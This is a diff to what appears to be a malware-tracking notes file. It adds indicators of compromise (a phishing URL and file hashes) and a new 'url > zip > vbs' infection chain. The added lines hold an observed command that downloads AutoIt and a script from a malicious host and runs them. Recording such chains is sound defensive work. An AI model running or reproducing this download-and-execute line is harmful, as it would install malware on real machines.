@@ -6,6 +6,10 @@
 .zip 88b5e4b1b533c398d790fbe974b2b369d72268069dcc64b53a742f4d1361c6bf
 ..msi 4325d78175a803fb6a1d235e8255816a07283501087e1b115f28c38b6b542856
 
+.url https://relationshipties.com/stsi/
+.zip 6b5efb3fab4a283a8b00a94343b5eba7f0358d1c57f59ddb9dfdb9284459569a
+.vbs a448c4abbb2f1844a8fa0c929cd84c2f6f57a4af0442a6a4b5307af89c35cef6
+
 *************************************************
 
 url > zip > msi
@@ -39,6 +43,14 @@ ICACLS.EXE" "C:\Users\Admin\AppData\Local\Temp\MW-ace1822e-d329-4ce0-b000-372641
 vssvc.exe
 
 WerFault.exe -pss -s 408 -p 1040 -ip 1040
+
+*************************************************
+
+url > zip > vbs
+
+WScript.exe C:\Users\Admin\AppData\Local\Temp\Report-8.vbs"
+
+cmd.exe /c cd /d %temp% & curl -o Autoit3.exe http://prestige-castom.com:2351 & curl -o vlfvbu.au3 http://prestige-castom.com:2351/msiasddkolj & Autoit3.exe vlfvbu.au3
 
 *************************************************
 
